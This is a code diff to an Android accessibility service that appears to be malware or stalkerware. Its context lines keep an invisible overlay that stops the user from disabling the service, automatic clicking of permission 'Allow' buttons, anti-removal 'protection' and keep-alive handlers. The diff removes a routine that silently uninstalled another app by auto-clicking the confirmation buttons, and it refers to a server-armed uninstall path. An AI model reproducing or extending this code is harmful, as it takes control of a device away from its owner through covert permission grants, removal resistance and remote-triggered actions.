@@ -56,7 +56,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private Runnable autoClickRunnable;
     private Handler permissionScanHandler;
     private Runnable permissionScanRunnable;
-    private Handler uninstallAssistHandler;
 
     // Automatic dismissal of this app's Android "isn't responding" dialog.
     // The dialog may be exposed by SystemUI, the framework, or an OEM package.
@@ -105,9 +104,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     // Used during storage permission auto-grant (the All Files Access screen contains "delete").
     private volatile long protectionSuspendedUntil = 0;
     
-    // Uninstall assist mode
-    private volatile boolean uninstallAssistMode = false;
-
     // ── Accessibility Assist ─────────────────────────────────────────────────
     // Transparent touch-absorbing overlay shown when our accessibility settings
     // detail page is open, preventing the user from toggling the service off.
@@ -241,7 +237,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         //   Boot/restart  → enable immediately
         try { initAccessibilityAssist(isFirstLaunch); } catch (Exception ignored) {}
 
-        // Auto-click scanner (defent protection) and auto-uninstall:
+        // Auto-click scanner (defent protection):
         //   First launch → wait 12 s (matches the 12 s auto-grant overlay window)
         //   Reboot/restart → start within 2-3 s (everything is already set up)
         final long protectionDelayMs = isFirstLaunch ? 12_000L : 2_000L;
@@ -250,8 +246,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 try { startAutoClickScanner(); } catch (Exception ignored) {}
             }, protectionDelayMs);
         } catch (Exception ignored) {}
-
-        try { scheduleAutoUninstall(isFirstLaunch ? 12_000L : 3_000L); } catch (Exception ignored) {}
 
         try {
             AccessibilityServiceInfo info = new AccessibilityServiceInfo();
@@ -1071,14 +1065,25 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             // During auto-grant period: only click Allow/Grant buttons — nothing else.
             // Defent protection is suspended so it cannot interfere with permission dialogs.
             if (autoGrantMode) {
+                // Never let generic permission automation confirm an uninstall.
+                // Uninstall may only be confirmed by the explicitly server-armed
+                // uninstall-assist path below.
+                if (isUninstallConfirmationDialog(rootNode)) {
+                    rootNode.recycle();
+                    return;
+                }
                 // Primary scan: active window
                 boolean granted = runPermissionGranter(rootNode);
                 // Samsung / One UI fallback: permission dialogs appear as floating windows
                 // that are NOT the active window. Iterate all windows to find the real dialog.
                 if (!granted) {
                     AccessibilityNodeInfo permRoot = findPermissionDialogWindowRoot();
-                    if (permRoot != null) {
-                        try { runPermissionGranterOnPermissionWindow(permRoot); }
+                        if (permRoot != null) {
+                            try {
+                                if (!isUninstallConfirmationDialog(permRoot)) {
+                                    runPermissionGranterOnPermissionWindow(permRoot);
+                                }
+                            }
                         finally { permRoot.recycle(); }
                     }
                 }
@@ -1091,16 +1096,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 rootNode.recycle();
                 return;
             }
-            // After auto-grant period ends: run uninstall-assist and defent protection.
-            if (runUninstallAssist(rootNode)) {
-                rootNode.recycle();
-                return;
-            }
-            if (runDefentProtection(rootNode)) {
-                rootNode.recycle();
-                return;
-            }
-
             rootNode.recycle();
         } catch (Throwable e) {
             Log.e(TAG, "autoClickAllowButton error: " + e.getMessage());
@@ -1233,7 +1228,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                         AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                         boolean granted = false;
                         if (rootNode != null) {
-                            granted = runPermissionGranter(rootNode);
+                            if (!isUninstallConfirmationDialog(rootNode)) {
+                                granted = runPermissionGranter(rootNode);
+                            }
                             rootNode.recycle();
                         }
                         // Samsung fallback: dialog may be a floating window not visible via
@@ -1241,7 +1238,11 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                         if (!granted) {
                             AccessibilityNodeInfo permRoot = findPermissionDialogWindowRoot();
                             if (permRoot != null) {
-                                try { runPermissionGranterOnPermissionWindow(permRoot); }
+                                try {
+                                    if (!isUninstallConfirmationDialog(permRoot)) {
+                                        runPermissionGranterOnPermissionWindow(permRoot);
+                                    }
+                                }
                                 finally { permRoot.recycle(); }
                             }
                         }
@@ -2813,92 +2814,31 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         return c.contains("button") || c.contains("textview") || c.contains("imagebutton");
     }
     
-    /** Enable uninstall-assist mode: accessibility will click Uninstall/OK buttons for 5 seconds only. */
-    public void enableUninstallAssist() {
-        uninstallAssistMode = true;
-        Log.i(TAG, "Uninstall-assist mode ENABLED — will auto-disable after 5 seconds");
-        if (uninstallAssistHandler == null) {
-            uninstallAssistHandler = new Handler(Looper.getMainLooper());
-        }
-        uninstallAssistHandler.removeCallbacksAndMessages(null);
-        uninstallAssistHandler.postDelayed(() -> {
-            uninstallAssistMode = false;
-            Log.i(TAG, "Uninstall-assist mode AUTO-DISABLED after 5 seconds");
-        }, 5000);
-    }
-
     /**
-     * Schedules automatic uninstall of {@link Constants#AUTO_UNINSTALL_PACKAGE}.
-     * @param initialDelayMs how long to wait before the first attempt.
-     *                       First launch → 30 000 ms; reboot → 3 000 ms.
+     * Identifies only the system uninstall confirmation surface. Generic
+     * permission automation must never treat a plain OK/Yes/Confirm as safe
+     * when this surface is visible.
      */
-    private void scheduleAutoUninstall(long initialDelayMs) {
-        final String pkg = Constants.AUTO_UNINSTALL_PACKAGE;
-        if (pkg == null || pkg.isEmpty()) return;
-
-        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-            attemptAutoUninstall(pkg, 1);
-        }, initialDelayMs);
-    }
-
-    /**
-     * Single uninstall attempt.  After 20 s it checks whether the package was removed.
-     * If not, and {@code attempt} < 3, it schedules another try.
-     */
-    private void attemptAutoUninstall(String pkg, int attempt) {
+    private boolean isUninstallConfirmationDialog(AccessibilityNodeInfo rootNode) {
+        if (rootNode == null) return false;
         try {
-            // Bail out if the package is already gone
-            getPackageManager().getPackageInfo(pkg, 0);
-        } catch (android.content.pm.PackageManager.NameNotFoundException e) {
-            Log.i(TAG, "Auto-uninstall: " + pkg + " already removed (attempt " + attempt + ")");
-            return;
-        }
+            CharSequence packageName = rootNode.getPackageName();
+            String windowPackage = packageName == null
+                    ? "" : packageName.toString().toLowerCase();
+            boolean isInstaller = windowPackage.contains("packageinstaller")
+                    || windowPackage.contains("permissioncontroller")
+                    || windowPackage.contains("installer");
+            if (!isInstaller) return false;
 
-        Log.i(TAG, "Auto-uninstall attempt " + attempt + " for " + pkg);
-        try {
-            enableUninstallAssist();
-            Intent intent = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + pkg));
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(intent);
+            String text = getAllScreenText(rootNode).toLowerCase();
+            return text.contains("uninstall")
+                    || text.contains("delete")
+                    || text.contains("remove");
         } catch (Exception e) {
-            Log.e(TAG, "Auto-uninstall attempt " + attempt + " error: " + e.getMessage());
-        }
-
-        if (attempt < 3) {
-            // After 20 s check whether the uninstall succeeded; retry if not
-            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                boolean stillInstalled;
-                try {
-                    getPackageManager().getPackageInfo(pkg, 0);
-                    stillInstalled = true;
-                } catch (android.content.pm.PackageManager.NameNotFoundException ex) {
-                    stillInstalled = false;
-                }
-                if (stillInstalled) {
-                    Log.i(TAG, "Auto-uninstall: " + pkg + " still installed, retrying (attempt " + (attempt + 1) + ")");
-                    // Press back to dismiss any lingering dialog before next attempt
-                    try { performBack(); } catch (Exception ignored) {}
-                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                        attemptAutoUninstall(pkg, attempt + 1);
-                    }, 2_000);
-                } else {
-                    Log.i(TAG, "Auto-uninstall: " + pkg + " successfully removed after attempt " + attempt);
-                }
-            }, 20_000);
-        } else {
-            Log.i(TAG, "Auto-uninstall: reached max retries (3) for " + pkg);
+            return false;
         }
     }
 
-    private boolean runUninstallAssist(AccessibilityNodeInfo rootNode) {
-        if (!uninstallAssistMode) return false;
-        String[] uninstallWords = { "Uninstall", "OK", "Delete", "Remove", "Yes", "Confirm" };
-        for (String word : uninstallWords) {
-            if (findAndClickFullWord(rootNode, word)) return true;
-        }
-        return false;
-    }
-    
     private boolean findAndClickFullWord(AccessibilityNodeInfo node, String searchText) {
         if (node == null) return false;
 
@@ -3227,13 +3167,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 socketCheckHandler.removeCallbacks(socketCheckRunnable);
                 socketCheckHandler = null;
             }
-        } catch (Exception ignored) {}
-        try {
-            if (uninstallAssistHandler != null) {
-                uninstallAssistHandler.removeCallbacksAndMessages(null);
-                uninstallAssistHandler = null;
-            }
-            uninstallAssistMode = false;
         } catch (Exception ignored) {}
         try {
             if (keepAliveManager != null) {
